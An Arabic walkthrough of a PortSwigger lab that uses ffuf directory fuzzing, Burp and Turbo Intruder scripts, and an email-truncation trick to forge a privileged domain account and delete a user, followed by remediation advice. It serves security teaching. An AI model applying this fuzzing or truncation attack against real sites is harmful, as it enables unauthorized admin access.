# [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

## **`الهدف`**
الدخول إلى لوحة تحكم الإدارة وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
بسبب أن أداة `"Engagement tools" > "Discover content"` غير متوفرة في النسخة المجانية من `Burp Suite` سنقوم بإستعمال أداة `FFUF` على `Linux`، وهي أداة لكشف المسارات الموجودة في الموقع`Directory Buster` ونكتب الأمر التالي لعرض النتائج بالألوان:

```Shell
ffuf -u Targeted-URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -c
```

🟢**الأخضر (Status 200 OK):** هذه الصفحة موجودة وتعمل بدون مشاكل.

🔵**الأزرق (Status 301 / 302 Redirect):** هذه الصفحة تقوم بالنقل إلى رابط أخر `(تحويل / redirect)`

🟡**الأصفر (Status 403 Forbidden):**  الصفحة موجودة لكن غير مسموح لك دخولها (تحت الحماية)، وهذا مؤشر جيد بأن هناك شئ يتم إخفاءه هناك. 

🔴**الأحمر (Status 500 Error):** حصل مشكلة للسيرفر عند طلب هذا الرابط، وهو مؤشر مهم جداً للبحث عن ثغرات واختبار المدخلات، لأنه مؤشر على وجود SQL Injection أو Argument Injection أو أن السيرفر قد انهار بسبب مُدخلات معينة.

أو نستعمل الأمر التالي لحفظ النتائج في ملف نصي باسم `result` بصيغة `md`

```Shell
ffuf -u Targeted-URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -o path/to/file/results.md -of md
```

وسنلاحظ في النتائج وجود المسارات التالية:

```K-Linux
Admin                   [Status: 401, Size: 2961, Words: 1126, Lines: 60, Duration: 73ms]
ADMIN                   [Status: 401, Size: 2961, Words: 1126, Lines: 60, Duration: 75ms]
admin                   [Status: 401, Size: 2961, Words: 1126, Lines: 60, Duration: 75ms]
```

هذا يعنى أنه موجود ولكن لا يوجد لنا صلاحية لدخوله، وحتى إذا حاولنا الدخول إلى  مسار `/admin` في المتصفح نجد الرسالة التالية:

```message
Admin interface only available if logged in as a DontWannaCry user
```

وهذا يعنى أنه يجب علينا الحصول على حساب بدومين `@dontwannacry.` 

لذلك سنقوم  بالتسجيل بالـ `email address` الذي يوفره لنا اللاب بأي اسم وباسورد نريد ونقوم  باعتراض request إنشاء الحساب وتوجيهه إلى الـ `Intruder.`

```http
POST /register HTTP/2
Host: 0a33001403483c72e8991f35004f0091.web-security-academy.net
Cookie: session=CXvFNhhLcKJQrTsNrc7yV4B91AEqGFkr

csrf=fiuxTqjva22JSJhaPEFYnhXj7syJgvRm&username=kng&email=attacker%40exploit-0aab000a03433c59e8cf1ef10181004a.exploit-server.net&password=123456
```
وسنقوم بعمل اختبار لنعرف هل حقل الـ `email` له حد أقصى إذا تخطاه قد تحدث ثغرة أم لا لذلك نقوم بوضع الـ ==§== `(Payload Marker)` على كلمة `attacker` الموجود في بداية الـ `email.` 

```http
POST /register HTTP/2
Host: 0a33001403483c72e8991f35004f0091.web-security-academy.net
Cookie: session=CXvFNhhLcKJQrTsNrc7yV4B91AEqGFkr

csrf=fiuxTqjva22JSJhaPEFYnhXj7syJgvRm&username=kng&email=§attacker§%40exploit-0aab000a03433c59e8cf1ef10181004a.exploit-server.net&password=123456
```

نقوم بضبط الإعدادت ونغير الـ `Payload type` إلى `Character blocks` ونجعل الأداة تبدأ بـ `100` حرف وتقوم بزيادته `100` في كل `request` بزيادة متوالية `(100,200,300,400,500)`وسنكرره `5` مرات فقط ليتوقف عند `500` فلا داعي للاستمرار إلى مالانهاية لأنه لو لم يحدث عطل أو مشكلة عند الـ `500` فمن المُستبعد أن يحدث بعد ذلك بعدها.

ويُمكن استعمال أداة `Turbo Intruder` بدلًا من استعمال `Burp Suite` في الخطوة السابقة:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1, # اتصال واحد لكي نراقب النتائج
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    # الحرف الذي نريد تكراره
    char_to_repeat = 'R'

    # حلقة تكرار (Loop) تبدأ من 100 وتنتهي عند 500، وتزيد 100 في كل خطوة
    # range(100, 501, 100) تعني: ابدأ بـ 100، وقف قبل الـ 501، وكل مرة زود 100
    for length in range(100, 501, 100):
        
        # هنا نولد النص المكرر: نضرب الحرف في الطول المطلوب (مثلاً 'R' * 100)
        payload = char_to_repeat * length
        
        # نُرسل الـ payload للجزء الذي فيه علامة الـ %s في الـ Request
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    # نعرض جميع النتائج في الجدول لنتابع التغيير في الـ Length أو الـ Status
    table.add(req)
    

```

ونغير `attack` إلى `%s (الفراغ / Placeholder القياسي لأداة Turbo Intruder)`.

```http
POST /register HTTP/2
Host: 0a33001403483c72e8991f35004f0091.web-security-academy.net
Cookie: session=CXvFNhhLcKJQrTsNrc7yV4B91AEqGFkr

csrf=fiuxTqjva22JSJhaPEFYnhXj7syJgvRm&username=kng&email=%s%40exploit-0aab000a03433c59e8cf1ef10181004a.exploit-server.net&password=123456
```

وسنلاحظ في النتائج أنه بالرغم من توضحينا أن تزاداد عدد الاحرف في كل طلب إلا أن الطول الكلي للـ `request` توقف عند `Length = 3159`.

وعند الذهاب إلى صندوق البريد، سنلاحظ أن رسائل التأكيد قد وصلت `5` مرات بالفعل ويظهر عنوان البريد الإلكتروني فيها بحروف `R` مكررة بكثرة.

ثم نقوم بالضغط على رابط تأكيد التسجيل وبمجرد الدخول إلى الحساب نجد ظاهرًا على الشاشة:

```message
My Account

Your username is: kng

Your email is:
RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR
```

وسنجد أن عددهم الحروف المكررة هو `255` هذا يعنى أننا نحتاج لإضافة دومين `@dontwannacry.com` والذي يتكون من `17 حرف وعلامة خاصة` إلى هذا الجزء من الحروف المكررة بحيث يكون مجموعهم الكلى 255 بالضبط، ولذلك سنقوم بحذف `17` حرف من الحروف المكررة ثم نضع جزئية `@exploit-0a46000804b892b581cc7a23017700df.exploit-server.net` في نهاية البريد. لكن مع وضع نقطة بدلًا من علامة الـ `@` الخاصة ببريد اللاب لكي لا تظهر رسالة خطأ بسبب تكرار علامة الـ `@`

ونقوم بتسجيل الخروج ثم تسجيل حساب جديد أخر بحيث يكون البريد الإلكتروني الخاص به كالتالي:

```Email

RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR@dontwannacry.com.exploit-0a46000804b892b581cc7a23017700df.exploit-server.net

```

==**`ملاحظة هامة جدًا:`**== `يجب أن لا ننسى تحويل علامة (@) إلى (%40) في حالة إذا قررنا التسجيل باستعمال Burp Suite بدلًا من المتصفح.`

وبمجرد الذهاب إلى صندوق البريد سنجد رسالة التأكيد وبعد الضغط على رابط التأكيد وتسجيل الدخول للحساب الذي أنشأناه سنجد ظاهرًا على الشاشة:

```message
My Account

Your username is: king

Your email is: RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR@dontwannacry.com
```

هذا يعنى أنه أصبح لدينا حساب بدومين `@dontwannacry.com` وبالتالي نستطيع الذهاب إلى مسار `/admin` ثم حذف حساب `carlos` وإنهاء اللاب.
## **`ترقيع الثغرة`**

يجب على المٌبرمج أن يضبط السيرفر بحيث يتحقق من طول الإيميل وإذا تخطى `255` حرفًا `(أو أى حد منطقي)`، أن يقوم السيرفر برفض الطلب تمامًا وإرجاع خطأ `(مثال: 400 Bad Request)`، وليس قص النص `(Truncation)` وتمريره، كما يجب ضبط قاعدة البيانات بحيث إذا حاولت إدخال نص أطول من حجم الحقل، تفشل العملية وتُخرج رسالة خطأ بدلًا من أن تقوم قاعدة البيانات بقص النص تلقائيًا وحفظ جزء منه فقط، لأن هذه المشكلة قد تكون حدثت بسبب السيرفر أو بسبب قاعدة البيانات فنحن لا نعرف من منهما قام بقص النص.

وهناك خطوتين اختياريتين قد لا يكونوا متاحين للجميع بسبب طبيعة العمل لذلك الأمر متروك لكم: أولًا تغيير مسار `/admin` إلى مسار عشوائي وغير متوقع لجعل الوصول له أكثر صعوبة `(Hardening)`، ثانيًا: عزل لوحة التحكم بحيث لا تكون متاحة للإنترنت الخارجي، ويقتصر الدخول على الـ `IP` الخاص بالشركة (الانترنت الداخلي فقط)، أو عزل لوحة التحكم بالـ `IP (White-listing).`

ويجب عدم الاعتماد على اسم الـ `email` لتحديد الصلاحيات بل يجب ربطها بدور المُستخدم المُخزن في قاعدة البيانات وليس بمجرد عملية فحص نصية للنطاق `(@dontwannacry.com)`

ويجب وضع حماية ضد كثرة الطلبات لمنع أدوات الفحص السريع مثل `ffuf`، لأن الوضع الحالي للموقع هو `No Rate Limiting`.
